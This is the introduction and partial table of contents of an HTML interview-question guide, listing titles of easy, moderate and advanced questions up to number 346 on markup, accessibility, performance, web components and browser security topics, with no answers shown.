# HTML Interview Questions and Answers

_Last updated: October 28, 2026_

450 HTML interview questions with answers, split into three levels: 150 easy, 150 moderate and 150 advanced.

The answers follow the current HTML Living Standard maintained by the WHATWG, as supported by current versions of Chrome, Edge, Firefox and Safari. Newer features (like popovers, invoker commands and the customizable `<select>`) are marked when they don't work in every browser yet, and older approaches are mentioned where you will still see them in real projects.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: What is HTML?](#1-what-is-html)
- [2: What is the difference between HTML and HTML5?](#2-what-is-the-difference-between-html-and-html5)
- [3: Who maintains the HTML standard?](#3-who-maintains-the-html-standard)
- [4: What is an HTML element?](#4-what-is-an-html-element)
- [5: What is the difference between a tag and an element?](#5-what-is-the-difference-between-a-tag-and-an-element)
- [6: What are HTML attributes?](#6-what-are-html-attributes)
- [7: What is a void element?](#7-what-is-a-void-element)
- [8: Do void elements need a closing slash like `<br />`?](#8-do-void-elements-need-a-closing-slash-like-br-)
- [9: What is the DOCTYPE and why do you need it?](#9-what-is-the-doctype-and-why-do-you-need-it)
- [10: What happens if you leave out the DOCTYPE?](#10-what-happens-if-you-leave-out-the-doctype)
- [11: What is the basic structure of an HTML document?](#11-what-is-the-basic-structure-of-an-html-document)
- [12: What does the `lang` attribute on `<html>` do?](#12-what-does-the-lang-attribute-on-html-do)
- [13: What goes inside the `<head>` element?](#13-what-goes-inside-the-head-element)
- [14: What does `<meta charset="utf-8">` do and why should it come first?](#14-what-does-meta-charsetutf-8-do-and-why-should-it-come-first)
- [15: What is the viewport meta tag?](#15-what-is-the-viewport-meta-tag)
- [16: What is the `<title>` element used for?](#16-what-is-the-title-element-used-for)
- [17: What is the difference between `<head>` and `<header>`?](#17-what-is-the-difference-between-head-and-header)
- [18: What are heading elements and how should you use them?](#18-what-are-heading-elements-and-how-should-you-use-them)
- [19: Can a page have more than one `<h1>`?](#19-can-a-page-have-more-than-one-h1)
- [20: How does HTML handle whitespace in text?](#20-how-does-html-handle-whitespace-in-text)
- [21: How do you add a line break and when should you avoid `<br>`?](#21-how-do-you-add-a-line-break-and-when-should-you-avoid-br)
- [22: What is `<hr>` for?](#22-what-is-hr-for)
- [23: How do you create a link?](#23-how-do-you-create-a-link)
- [24: What is the difference between absolute and relative URLs?](#24-what-is-the-difference-between-absolute-and-relative-urls)
- [25: How do you open a link in a new tab?](#25-how-do-you-open-a-link-in-a-new-tab)
- [26: How do you link to a specific part of the same page?](#26-how-do-you-link-to-a-specific-part-of-the-same-page)
- [27: How do you create email and phone links?](#27-how-do-you-create-email-and-phone-links)
- [28: How do you add an image to a page?](#28-how-do-you-add-an-image-to-a-page)
- [29: Why is the `alt` attribute important?](#29-why-is-the-alt-attribute-important)
- [30: When should `alt` be empty?](#30-when-should-alt-be-empty)
- [31: Why should you set `width` and `height` on images?](#31-why-should-you-set-width-and-height-on-images)
- [32: What is the difference between ordered and unordered lists?](#32-what-is-the-difference-between-ordered-and-unordered-lists)
- [33: What is a description list?](#33-what-is-a-description-list)
- [34: How do you nest lists?](#34-how-do-you-nest-lists)
- [35: How do you create a table?](#35-how-do-you-create-a-table)
- [36: What are `<thead>`, `<tbody>` and `<tfoot>`?](#36-what-are-thead-tbody-and-tfoot)
- [37: What is the difference between `<th>` and `<td>`?](#37-what-is-the-difference-between-th-and-td)
- [38: What do `colspan` and `rowspan` do?](#38-what-do-colspan-and-rowspan-do)
- [39: What is the `<caption>` element?](#39-what-is-the-caption-element)
- [40: What is an HTML form?](#40-what-is-an-html-form)
- [41: What do the `action` and `method` attributes on a form do?](#41-what-do-the-action-and-method-attributes-on-a-form-do)
- [42: What is the difference between GET and POST for forms?](#42-what-is-the-difference-between-get-and-post-for-forms)
- [43: What does the `name` attribute do on form fields?](#43-what-does-the-name-attribute-do-on-form-fields)
- [44: What are the common `<input>` types?](#44-what-are-the-common-input-types)
- [45: What is the `<label>` element and why is it important?](#45-what-is-the-label-element-and-why-is-it-important)
- [46: What are the two ways to link a label to a field?](#46-what-are-the-two-ways-to-link-a-label-to-a-field)
- [47: Why isn't a placeholder a replacement for a label?](#47-why-isnt-a-placeholder-a-replacement-for-a-label)
- [48: What is a `<textarea>`?](#48-what-is-a-textarea)
- [49: How do you create a dropdown?](#49-how-do-you-create-a-dropdown)
- [50: What is `<optgroup>`?](#50-what-is-optgroup)
- [51: How do you group radio buttons?](#51-how-do-you-group-radio-buttons)
- [52: How do checkboxes work?](#52-how-do-checkboxes-work)
- [53: What is the `<button>` element and what types does it have?](#53-what-is-the-button-element-and-what-types-does-it-have)
- [54: What is the default type of a `<button>` inside a form?](#54-what-is-the-default-type-of-a-button-inside-a-form)
- [55: What is the difference between `<input type="submit">` and `<button type="submit">`?](#55-what-is-the-difference-between-input-typesubmit-and-button-typesubmit)
- [56: What does the `required` attribute do?](#56-what-does-the-required-attribute-do)
- [57: What is the difference between `disabled` and `readonly`?](#57-what-is-the-difference-between-disabled-and-readonly)
- [58: How do you set a default value for form fields?](#58-how-do-you-set-a-default-value-for-form-fields)
- [59: What are `<fieldset>` and `<legend>`?](#59-what-are-fieldset-and-legend)
- [60: What is semantic HTML?](#60-what-is-semantic-html)
- [61: Why does semantic HTML matter?](#61-why-does-semantic-html-matter)
- [62: What are the `<header>` and `<footer>` elements?](#62-what-are-the-header-and-footer-elements)
- [63: What is the `<nav>` element for?](#63-what-is-the-nav-element-for)
- [64: What is the `<main>` element?](#64-what-is-the-main-element)
- [65: What is the difference between `<article>` and `<section>`?](#65-what-is-the-difference-between-article-and-section)
- [66: What is the `<aside>` element?](#66-what-is-the-aside-element)
- [67: What is the difference between `<div>` and `<span>`?](#67-what-is-the-difference-between-div-and-span)
- [68: What is the difference between block and inline elements?](#68-what-is-the-difference-between-block-and-inline-elements)
- [69: What is the difference between `<strong>` and `<b>`?](#69-what-is-the-difference-between-strong-and-b)
- [70: What is the difference between `<em>` and `<i>`?](#70-what-is-the-difference-between-em-and-i)
- [71: What are `<small>` and `<mark>` used for?](#71-what-are-small-and-mark-used-for)
- [72: What are `<code>`, `<pre>`, `<kbd>` and `<samp>`?](#72-what-are-code-pre-kbd-and-samp)
- [73: What is the difference between `<blockquote>`, `<q>` and `<cite>`?](#73-what-is-the-difference-between-blockquote-q-and-cite)
- [74: What is the `<abbr>` element?](#74-what-is-the-abbr-element)
- [75: What is the `<time>` element?](#75-what-is-the-time-element)
- [76: What is the `<address>` element for?](#76-what-is-the-address-element-for)
- [77: What are `<figure>` and `<figcaption>`?](#77-what-are-figure-and-figcaption)
- [78: How do you write comments in HTML?](#78-how-do-you-write-comments-in-html)
- [79: What are character entities?](#79-what-are-character-entities)
- [80: How do you show the `<` character as text on a page?](#80-how-do-you-show-the--character-as-text-on-a-page)
- [81: What is `&nbsp;`?](#81-what-is-nbsp)
- [82: What are global attributes?](#82-what-are-global-attributes)
- [83: What is the difference between `id` and `class`?](#83-what-is-the-difference-between-id-and-class)
- [84: What happens if two elements have the same `id`?](#84-what-happens-if-two-elements-have-the-same-id)
- [85: What is the `style` attribute?](#85-what-is-the-style-attribute)
- [86: What are the ways to add CSS to an HTML page?](#86-what-are-the-ways-to-add-css-to-an-html-page)
- [87: How do you add JavaScript to a page?](#87-how-do-you-add-javascript-to-a-page)
- [88: Where should you put the `<script>` tag?](#88-where-should-you-put-the-script-tag)
- [89: What is the `<noscript>` element?](#89-what-is-the-noscript-element)
- [90: What is the `title` attribute and what are its limits?](#90-what-is-the-title-attribute-and-what-are-its-limits)
- [91: What are `data-*` attributes?](#91-what-are-data--attributes)
- [92: What does the `hidden` attribute do?](#92-what-does-the-hidden-attribute-do)
- [93: How do you add audio to a page?](#93-how-do-you-add-audio-to-a-page)
- [94: How do you add a video to a page?](#94-how-do-you-add-a-video-to-a-page)
- [95: What do the `controls`, `autoplay`, `muted`, `loop` and `poster` attributes do on `<video>`?](#95-what-do-the-controls-autoplay-muted-loop-and-poster-attributes-do-on-video)
- [96: Why doesn't my video autoplay?](#96-why-doesnt-my-video-autoplay)
- [97: What is the `<source>` element used for?](#97-what-is-the-source-element-used-for)
- [98: What is the `<track>` element?](#98-what-is-the-track-element)
- [99: What is an `<iframe>`?](#99-what-is-an-iframe)
- [100: How do you add a favicon?](#100-how-do-you-add-a-favicon)
- [101: Is HTML case-sensitive?](#101-is-html-case-sensitive)
- [102: What are boolean attributes?](#102-what-are-boolean-attributes)
- [103: Do attribute values need quotes?](#103-do-attribute-values-need-quotes)
- [104: What are some HTML nesting rules?](#104-what-are-some-html-nesting-rules)
- [105: What does the browser do with invalid HTML?](#105-what-does-the-browser-do-with-invalid-html)
- [106: How can you check if your HTML is valid?](#106-how-can-you-check-if-your-html-is-valid)
- [107: What is the DOM?](#107-what-is-the-dom)
- [108: What is the difference between HTML source and the DOM?](#108-what-is-the-difference-between-html-source-and-the-dom)
- [109: What is the `<base>` element?](#109-what-is-the-base-element)
- [110: What is the `<link>` element used for?](#110-what-is-the-link-element-used-for)
- [111: What is the meta description?](#111-what-is-the-meta-description)
- [112: What is the `<body>` element?](#112-what-is-the-body-element)
- [113: What are `<sub>` and `<sup>`?](#113-what-are-sub-and-sup)
- [114: What are `<del>`, `<ins>` and `<s>`?](#114-what-are-del-ins-and-s)
- [115: What does `<u>` mean in modern HTML?](#115-what-does-u-mean-in-modern-html)
- [116: What is the `<wbr>` element?](#116-what-is-the-wbr-element)
- [117: What is the `<template>` element?](#117-what-is-the-template-element)
- [118: What is the `<dialog>` element?](#118-what-is-the-dialog-element)
- [119: What are `<details>` and `<summary>`?](#119-what-are-details-and-summary)
- [120: What is the difference between `<progress>` and `<meter>`?](#120-what-is-the-difference-between-progress-and-meter)
- [121: What is the `<output>` element?](#121-what-is-the-output-element)
- [122: What is `<datalist>`?](#122-what-is-datalist)
- [123: What is the `<canvas>` element?](#123-what-is-the-canvas-element)
- [124: How do you use SVG in HTML?](#124-how-do-you-use-svg-in-html)
- [125: What is the `<picture>` element?](#125-what-is-the-picture-element)
- [126: What are `<embed>` and `<object>`?](#126-what-are-embed-and-object)
- [127: What are some deprecated HTML elements?](#127-what-are-some-deprecated-html-elements)
- [128: What is the `<search>` element?](#128-what-is-the-search-element)
- [129: What is the `<menu>` element?](#129-what-is-the-menu-element)
- [130: What is the `<data>` element?](#130-what-is-the-data-element)
- [131: What is the `<ruby>` element?](#131-what-is-the-ruby-element)
- [132: What are `<bdi>` and `<bdo>`?](#132-what-are-bdi-and-bdo)
- [133: What is the `dir` attribute?](#133-what-is-the-dir-attribute)
- [134: What is `contenteditable`?](#134-what-is-contenteditable)
- [135: What is `tabindex`?](#135-what-is-tabindex)
- [136: What is the `spellcheck` attribute?](#136-what-is-the-spellcheck-attribute)
- [137: What is the `translate` attribute?](#137-what-is-the-translate-attribute)
- [138: Can you set `lang` on parts of a page?](#138-can-you-set-lang-on-parts-of-a-page)
- [139: What does the `download` attribute on a link do?](#139-what-does-the-download-attribute-on-a-link-do)
- [140: What does the `autocomplete` attribute do?](#140-what-does-the-autocomplete-attribute-do)
- [141: What does the `autofocus` attribute do?](#141-what-does-the-autofocus-attribute-do)
- [142: What do `min`, `max` and `step` do on inputs?](#142-what-do-min-max-and-step-do-on-inputs)
- [143: What do `minlength` and `maxlength` do?](#143-what-do-minlength-and-maxlength-do)
- [144: What does the `pattern` attribute do?](#144-what-does-the-pattern-attribute-do)
- [145: What does the `multiple` attribute do?](#145-what-does-the-multiple-attribute-do)
- [146: How do you let users upload files?](#146-how-do-you-let-users-upload-files)
- [147: What is `<input type="hidden">`?](#147-what-is-input-typehidden)
- [148: What is the `enctype` attribute on a form?](#148-what-is-the-enctype-attribute-on-a-form)
- [149: What is the robots meta tag?](#149-what-is-the-robots-meta-tag)
- [150: What are the roles of HTML, CSS and JavaScript?](#150-what-are-the-roles-of-html-css-and-javascript)

### Moderate Questions (151-300)

- [151: What does the browser do when it loads an HTML page?](#151-what-does-the-browser-do-when-it-loads-an-html-page)
- [152: Why does a normal `<script>` tag block parsing?](#152-why-does-a-normal-script-tag-block-parsing)
- [153: What is the difference between `async` and `defer`?](#153-what-is-the-difference-between-async-and-defer)
- [154: How do `type="module"` scripts behave?](#154-how-do-typemodule-scripts-behave)
- [155: What is the `nomodule` attribute?](#155-what-is-the-nomodule-attribute)
- [156: Why is CSS render-blocking?](#156-why-is-css-render-blocking)
- [157: What does `<link rel="preload">` do?](#157-what-does-link-relpreload-do)
- [158: What is `<link rel="prefetch">`?](#158-what-is-link-relprefetch)
- [159: What do `preconnect` and `dns-prefetch` do?](#159-what-do-preconnect-and-dns-prefetch-do)
- [160: What is `<link rel="modulepreload">`?](#160-what-is-link-relmodulepreload)
- [161: What is the `fetchpriority` attribute?](#161-what-is-the-fetchpriority-attribute)
- [162: How does `loading="lazy"` work?](#162-how-does-loadinglazy-work)
- [163: What does the `decoding` attribute on images do?](#163-what-does-the-decoding-attribute-on-images-do)
- [164: How do `srcset` and `sizes` work with `w` descriptors?](#164-how-do-srcset-and-sizes-work-with-w-descriptors)
- [165: When do you use `x` descriptors in `srcset`?](#165-when-do-you-use-x-descriptors-in-srcset)
- [166: What is art direction with `<picture>`?](#166-what-is-art-direction-with-picture)
- [167: How do you serve modern image formats with a fallback?](#167-how-do-you-serve-modern-image-formats-with-a-fallback)
- [168: How do you prevent layout shift from images and embeds?](#168-how-do-you-prevent-layout-shift-from-images-and-embeds)
- [169: What makes good `alt` text?](#169-what-makes-good-alt-text)
- [170: Should decorative images be `<img alt="">` or CSS backgrounds?](#170-should-decorative-images-be-img-alt-or-css-backgrounds)
- [171: What are the ways to include SVG and their trade-offs?](#171-what-are-the-ways-to-include-svg-and-their-trade-offs)
- [172: How do you make SVG icons accessible?](#172-how-do-you-make-svg-icons-accessible)
- [173: When should you use `<canvas>` vs SVG?](#173-when-should-you-use-canvas-vs-svg)
- [174: What is ARIA?](#174-what-is-aria)
- [175: What is the "first rule of ARIA"?](#175-what-is-the-first-rule-of-aria)
- [176: What does the `role` attribute do?](#176-what-does-the-role-attribute-do)
- [177: What is the difference between `aria-label` and `aria-labelledby`?](#177-what-is-the-difference-between-aria-label-and-aria-labelledby)
- [178: What does `aria-describedby` do?](#178-what-does-aria-describedby-do)
- [179: What does `aria-hidden="true"` do?](#179-what-does-aria-hiddentrue-do)
- [180: What are ARIA live regions?](#180-what-are-aria-live-regions)
- [181: What do `aria-expanded` and `aria-controls` do?](#181-what-do-aria-expanded-and-aria-controls-do)
- [182: What is `aria-current`?](#182-what-is-aria-current)
- [183: What are landmark roles and their HTML equivalents?](#183-what-are-landmark-roles-and-their-html-equivalents)
- [184: What is a skip link?](#184-what-is-a-skip-link)
- [185: Why does heading structure matter for screen reader users?](#185-why-does-heading-structure-matter-for-screen-reader-users)
- [186: What is an accessible name and how is it calculated?](#186-what-is-an-accessible-name-and-how-is-it-calculated)
- [187: Why use `<button>` instead of `<div onclick>`?](#187-why-use-button-instead-of-div-onclick)
- [188: When should you use a link vs a button?](#188-when-should-you-use-a-link-vs-a-button)
- [189: What is the difference between `tabindex="0"`, `tabindex="-1"` and a positive `tabindex`?](#189-what-is-the-difference-between-tabindex0-tabindex-1-and-a-positive-tabindex)
- [190: Why should you avoid positive `tabindex` values?](#190-why-should-you-avoid-positive-tabindex-values)
- [191: How do you make a custom interactive widget keyboard accessible?](#191-how-do-you-make-a-custom-interactive-widget-keyboard-accessible)
- [192: How do you make data tables accessible?](#192-how-do-you-make-data-tables-accessible)
- [193: How do you show form errors in an accessible way?](#193-how-do-you-show-form-errors-in-an-accessible-way)
- [194: How do you group related form controls for accessibility?](#194-how-do-you-group-related-form-controls-for-accessibility)
- [195: What is the Constraint Validation API?](#195-what-is-the-constraint-validation-api)
- [196: What is `ValidityState`?](#196-what-is-validitystate)
- [197: What do `novalidate` and `formnovalidate` do?](#197-what-do-novalidate-and-formnovalidate-do)
- [198: What is the difference between `:invalid` and `:user-invalid`?](#198-what-is-the-difference-between-invalid-and-user-invalid)
- [199: How do input types like `email`, `tel` and `url` help on mobile?](#199-how-do-input-types-like-email-tel-and-url-help-on-mobile)
- [200: What is the `inputmode` attribute?](#200-what-is-the-inputmode-attribute)
- [201: What is the `enterkeyhint` attribute?](#201-what-is-the-enterkeyhint-attribute)
- [202: Which `autocomplete` values should you know?](#202-which-autocomplete-values-should-you-know)
- [203: What does the `form` attribute on an input do?](#203-what-does-the-form-attribute-on-an-input-do)
- [204: What are `formaction`, `formmethod` and similar button attributes?](#204-what-are-formaction-formmethod-and-similar-button-attributes)
- [205: How do you get form data in JavaScript?](#205-how-do-you-get-form-data-in-javascript)
- [206: What is the difference between `form.submit()` and `form.requestSubmit()`?](#206-what-is-the-difference-between-formsubmit-and-formrequestsubmit)
- [207: How do you handle a form submit with JavaScript?](#207-how-do-you-handle-a-form-submit-with-javascript)
- [208: What is sent for an unchecked checkbox?](#208-what-is-sent-for-an-unchecked-checkbox)
- [209: Are disabled and readonly fields sent with the form?](#209-are-disabled-and-readonly-fields-sent-with-the-form)
- [210: What format do date and time inputs use for their values?](#210-what-format-do-date-and-time-inputs-use-for-their-values)
- [211: What are `type="range"` and `type="color"`?](#211-what-are-typerange-and-typecolor)
- [212: What are the limits of wrapping an input in a `<label>`?](#212-what-are-the-limits-of-wrapping-an-input-in-a-label)
- [213: What is the difference between `dialog.show()` and `dialog.showModal()`?](#213-what-is-the-difference-between-dialogshow-and-dialogshowmodal)
- [214: How does `<form method="dialog">` work?](#214-how-does-form-methoddialog-work)
- [215: What are the `::backdrop` pseudo-element and the `cancel` event on dialogs?](#215-what-are-the-backdrop-pseudo-element-and-the-cancel-event-on-dialogs)
- [216: What is the Popover API?](#216-what-is-the-popover-api)
- [217: What is the difference between `popover="auto"` and `popover="manual"`?](#217-what-is-the-difference-between-popoverauto-and-popovermanual)
- [218: What do `popovertarget` and `popovertargetaction` do?](#218-what-do-popovertarget-and-popovertargetaction-do)
- [219: When should you use a popover vs a `<dialog>`?](#219-when-should-you-use-a-popover-vs-a-dialog)
- [220: How do you build an exclusive accordion with `<details>`?](#220-how-do-you-build-an-exclusive-accordion-with-details)
- [221: What is `hidden="until-found"`?](#221-what-is-hiddenuntil-found)
- [222: What is the `inert` attribute?](#222-what-is-the-inert-attribute)
- [223: How do you use the `<template>` element with JavaScript?](#223-how-do-you-use-the-template-element-with-javascript)
- [224: What are web components?](#224-what-are-web-components)
- [225: What are the naming rules for custom elements?](#225-what-are-the-naming-rules-for-custom-elements)
- [226: What problems come with `contenteditable`?](#226-what-problems-come-with-contenteditable)
- [227: How do `data-*` attributes map to `dataset` in JavaScript?](#227-how-do-data--attributes-map-to-dataset-in-javascript)
- [228: What are Open Graph meta tags?](#228-what-are-open-graph-meta-tags)
- [229: What are Twitter (X) card meta tags?](#229-what-are-twitter-x-card-meta-tags)
- [230: What is a canonical link?](#230-what-is-a-canonical-link)
- [231: What is `hreflang` used for?](#231-what-is-hreflang-used-for)
- [232: What is the difference between `robots.txt` and the robots meta tag?](#232-what-is-the-difference-between-robotstxt-and-the-robots-meta-tag)
- [233: What is structured data and how do you add it?](#233-what-is-structured-data-and-how-do-you-add-it)
- [234: What is microdata?](#234-what-is-microdata)
- [235: What is the `theme-color` meta tag?](#235-what-is-the-theme-color-meta-tag)
- [236: What is a web app manifest and how do you link it?](#236-what-is-a-web-app-manifest-and-how-do-you-link-it)
- [237: What icon links does a modern site need?](#237-what-icon-links-does-a-modern-site-need)
- [238: What does `<meta http-equiv>` do?](#238-what-does-meta-http-equiv-do)
- [239: What do `rel="nofollow"`, `rel="ugc"` and `rel="sponsored"` mean?](#239-what-do-relnofollow-relugc-and-relsponsored-mean)
- [240: What is the difference between `rel="noopener"` and `rel="noreferrer"`?](#240-what-is-the-difference-between-relnoopener-and-relnoreferrer)
- [241: Do you still need `rel="noopener"` with `target="_blank"`?](#241-do-you-still-need-relnoopener-with-target_blank)
- [242: What does the `sandbox` attribute on an `<iframe>` do?](#242-what-does-the-sandbox-attribute-on-an-iframe-do)
- [243: What does the `allow` attribute on an `<iframe>` do?](#243-what-does-the-allow-attribute-on-an-iframe-do)
- [244: What is the `srcdoc` attribute?](#244-what-is-the-srcdoc-attribute)
- [245: Why do iframes need a `title` attribute?](#245-why-do-iframes-need-a-title-attribute)
- [246: Should you lazy-load iframes?](#246-should-you-lazy-load-iframes)
- [247: How do a page and an iframe talk to each other?](#247-how-do-a-page-and-an-iframe-talk-to-each-other)
- [248: Why might characters like `Ã©` show up on a page instead of `é`?](#248-why-might-characters-like-ã-show-up-on-a-page-instead-of-é)
- [249: What is the difference between named and numeric character references?](#249-what-is-the-difference-between-named-and-numeric-character-references)
- [250: Why is it dangerous to put user input into `innerHTML`?](#250-why-is-it-dangerous-to-put-user-input-into-innerhtml)
- [251: What is the difference between `textContent`, `innerText` and `innerHTML`?](#251-what-is-the-difference-between-textcontent-innertext-and-innerhtml)
- [252: What is the difference between attributes and properties?](#252-what-is-the-difference-between-attributes-and-properties)
- [253: Why doesn't `setAttribute('disabled', 'false')` enable a button?](#253-why-doesnt-setattributedisabled-false-enable-a-button)
- [254: What is the difference between the `input` and `change` events?](#254-what-is-the-difference-between-the-input-and-change-events)
- [255: Is the HTML document outline algorithm real?](#255-is-the-html-document-outline-algorithm-real)
- [256: Does every `<section>` need a heading?](#256-does-every-section-need-a-heading)
- [257: Should every group of links be in a `<nav>`?](#257-should-every-group-of-links-be-in-a-nav)
- [258: Can a page have more than one `<header>` and `<footer>`?](#258-can-a-page-have-more-than-one-header-and-footer)
- [259: What are the rules for the `<main>` element?](#259-what-are-the-rules-for-the-main-element)
- [260: What are good uses of `<article>`?](#260-what-are-good-uses-of-article)
- [261: Is `<figure>` only for images?](#261-is-figure-only-for-images)
- [262: Why shouldn't you use tables for page layout?](#262-why-shouldnt-you-use-tables-for-page-layout)
- [263: How do you make a wide table work on small screens?](#263-how-do-you-make-a-wide-table-work-on-small-screens)
- [264: Why use lists for navigation menus?](#264-why-use-lists-for-navigation-menus)
- [265: How do you mark up breadcrumbs?](#265-how-do-you-mark-up-breadcrumbs)
- [266: How do you mark up pagination?](#266-how-do-you-mark-up-pagination)
- [267: What are content categories in HTML?](#267-what-are-content-categories-in-html)
- [268: Can you put a link inside a button, or a button inside a link?](#268-can-you-put-a-link-inside-a-button-or-a-button-inside-a-link)
- [269: Can an `<a>` element wrap block content like `<div>` and headings?](#269-can-an-a-element-wrap-block-content-like-div-and-headings)
- [270: What are the autoplay rules for video, and what does `playsinline` do?](#270-what-are-the-autoplay-rules-for-video-and-what-does-playsinline-do)
- [271: What does the `preload` attribute on `<video>` and `<audio>` do?](#271-what-does-the-preload-attribute-on-video-and-audio-do)
- [272: Why add codecs to the `type` attribute of `<source>`?](#272-why-add-codecs-to-the-type-attribute-of-source)
- [273: What is the difference between captions, subtitles and descriptions in `<track>`?](#273-what-is-the-difference-between-captions-subtitles-and-descriptions-in-track)
- [274: Which images should and shouldn't be lazy-loaded?](#274-which-images-should-and-shouldnt-be-lazy-loaded)
- [275: What is LCP and how can HTML help improve it?](#275-what-is-lcp-and-how-can-html-help-improve-it)
- [276: What is critical CSS and how do you include it?](#276-what-is-critical-css-and-how-do-you-include-it)
- [277: Is it better to put scripts at the end of `<body>` or in `<head>` with `defer`?](#277-is-it-better-to-put-scripts-at-the-end-of-body-or-in-head-with-defer)
- [278: Can you overuse resource hints?](#278-can-you-overuse-resource-hints)
- [279: How does DOM size affect performance?](#279-how-does-dom-size-affect-performance)
- [280: How do you load a print stylesheet without blocking rendering?](#280-how-do-you-load-a-print-stylesheet-without-blocking-rendering)
- [281: What does `<meta name="color-scheme">` do?](#281-what-does-meta-namecolor-scheme-do)
- [282: What does `<meta name="referrer">` do?](#282-what-does-meta-namereferrer-do)
- [283: How does `dir="auto"` help with user content?](#283-how-does-dirauto-help-with-user-content)
- [284: What formats does the `datetime` attribute on `<time>` accept?](#284-what-formats-does-the-datetime-attribute-on-time-accept)
- [285: When doesn't the `download` attribute work?](#285-when-doesnt-the-download-attribute-work)
- [286: How do you link to an RSS or Atom feed?](#286-how-do-you-link-to-an-rss-or-atom-feed)
- [287: How do `<meter>`'s `low`, `high` and `optimum` attributes work?](#287-how-do-meters-low-high-and-optimum-attributes-work)
- [288: How do you make an icon-only button accessible?](#288-how-do-you-make-an-icon-only-button-accessible)
- [289: What are the accessibility problems with placeholders?](#289-what-are-the-accessibility-problems-with-placeholders)
- [290: Should you use `required` and `aria-required` together?](#290-should-you-use-required-and-aria-required-together)
- [291: How do you style a custom checkbox while keeping it accessible?](#291-how-do-you-style-a-custom-checkbox-while-keeping-it-accessible)
- [292: How do you hide content visually but keep it for screen readers?](#292-how-do-you-hide-content-visually-but-keep-it-for-screen-readers)
- [293: What is the difference between `hidden`, `display: none`, `aria-hidden` and visually hidden?](#293-what-is-the-difference-between-hidden-display-none-aria-hidden-and-visually-hidden)
- [294: How is HTML for emails different from HTML for websites?](#294-how-is-html-for-emails-different-from-html-for-websites)
- [295: How do you test the accessibility of your HTML?](#295-how-do-you-test-the-accessibility-of-your-html)
- [296: What are common HTML mistakes you look for in code review?](#296-what-are-common-html-mistakes-you-look-for-in-code-review)
- [297: What are the main differences between HTML and JSX?](#297-what-are-the-main-differences-between-html-and-jsx)
- [298: What is the difference between HTML and XHTML?](#298-what-is-the-difference-between-html-and-xhtml)
- [299: What is the `<hgroup>` element?](#299-what-is-the-hgroup-element)
- [300: How do you write an accessible "Read more" link when you have many of them?](#300-how-do-you-write-an-accessible-read-more-link-when-you-have-many-of-them)

### Advanced Questions (301-450)

- [301: How does the HTML parser work?](#301-how-does-the-html-parser-work)
- [302: What is "foster parenting" in the HTML parser?](#302-what-is-foster-parenting-in-the-html-parser)
- [303: How does the parser recover from unclosed or misnested tags?](#303-how-does-the-parser-recover-from-unclosed-or-misnested-tags)
- [304: Which tags are optional in HTML?](#304-which-tags-are-optional-in-html)
- [305: What is the preload scanner?](#305-what-is-the-preload-scanner)
- [306: What patterns defeat the preload scanner?](#306-what-patterns-defeat-the-preload-scanner)
- [307: Why is `document.write()` bad?](#307-why-is-documentwrite-bad)
- [308: How exactly does CSS block rendering and scripts?](#308-how-exactly-does-css-block-rendering-and-scripts)
- [309: What is the `blocking="render"` attribute?](#309-what-is-the-blockingrender-attribute)
- [310: What is the critical rendering path?](#310-what-is-the-critical-rendering-path)
- [311: What is the difference between `DOMContentLoaded` and `load`?](#311-what-is-the-difference-between-domcontentloaded-and-load)
- [312: In what order do module scripts and `async` scripts run?](#312-in-what-order-do-module-scripts-and-async-scripts-run)
- [313: What are import maps?](#313-what-are-import-maps)
- [314: What is Subresource Integrity (SRI)?](#314-what-is-subresource-integrity-sri)
- [315: What does the `crossorigin` attribute do?](#315-what-does-the-crossorigin-attribute-do)
- [316: What is a "tainted" canvas?](#316-what-is-a-tainted-canvas)
- [317: How do nonces and hashes work with Content Security Policy?](#317-how-do-nonces-and-hashes-work-with-content-security-policy)
- [318: What is Trusted Types?](#318-what-is-trusted-types)
- [319: What are the common XSS injection points in HTML?](#319-what-are-the-common-xss-injection-points-in-html)
- [320: How do you safely render user-provided HTML?](#320-how-do-you-safely-render-user-provided-html)
- [321: What is clickjacking and how do you prevent it?](#321-what-is-clickjacking-and-how-do-you-prevent-it)
- [322: What are the risks of `sandbox="allow-scripts allow-same-origin"`?](#322-what-are-the-risks-of-sandboxallow-scripts-allow-same-origin)
- [323: What is reverse tabnabbing?](#323-what-is-reverse-tabnabbing)
- [324: What is dangling markup injection?](#324-what-is-dangling-markup-injection)
- [325: What is DOM clobbering?](#325-what-is-dom-clobbering)
- [326: How does HTML help protect forms against CSRF?](#326-how-does-html-help-protect-forms-against-csrf)
- [327: What is mixed content?](#327-what-is-mixed-content)
- [328: What is the default referrer policy and why does it matter?](#328-what-is-the-default-referrer-policy-and-why-does-it-matter)
- [329: How do Permissions Policy and the iframe `allow` attribute work together?](#329-how-do-permissions-policy-and-the-iframe-allow-attribute-work-together)
- [330: What is Declarative Shadow DOM?](#330-what-is-declarative-shadow-dom)
- [331: What are form-associated custom elements?](#331-what-are-form-associated-custom-elements)
- [332: What are the lifecycle callbacks of a custom element?](#332-what-are-the-lifecycle-callbacks-of-a-custom-element)
- [333: What are customized built-in elements and why aren't they used much?](#333-what-are-customized-built-in-elements-and-why-arent-they-used-much)
- [334: How do slots work in Shadow DOM?](#334-how-do-slots-work-in-shadow-dom)
- [335: What accessibility problems does Shadow DOM cause?](#335-what-accessibility-problems-does-shadow-dom-cause)
- [336: What happens when the parser finds a custom element before it's defined?](#336-what-happens-when-the-parser-finds-a-custom-element-before-its-defined)
- [337: What happens to a `<script>` inside a `<template>`?](#337-what-happens-to-a-script-inside-a-template)
- [338: Do scripts inserted with `innerHTML` run?](#338-do-scripts-inserted-with-innerhtml-run)
- [339: What is the performance difference between `innerHTML`, `createElement` and `DocumentFragment`?](#339-what-is-the-performance-difference-between-innerhtml-createelement-and-documentfragment)
- [340: What are `setHTMLUnsafe()` and `Document.parseHTMLUnsafe()`?](#340-what-are-sethtmlunsafe-and-documentparsehtmlunsafe)
- [341: What is the top layer?](#341-what-is-the-top-layer)
- [342: How do popovers decide what to close (light dismiss and nesting)?](#342-how-do-popovers-decide-what-to-close-light-dismiss-and-nesting)
- [343: How do you position a popover next to its button?](#343-how-do-you-position-a-popover-next-to-its-button)
- [344: What is `popover="hint"`?](#344-what-is-popoverhint)
- [345: What are invoker commands (`commandfor` and `command`)?](#345-what-are-invoker-commands-commandfor-and-command)
- [346: What does the `closedby` attribute on `<dialog>` do?](#346-what-does-the-closedby-attribute-on-dialog-do)
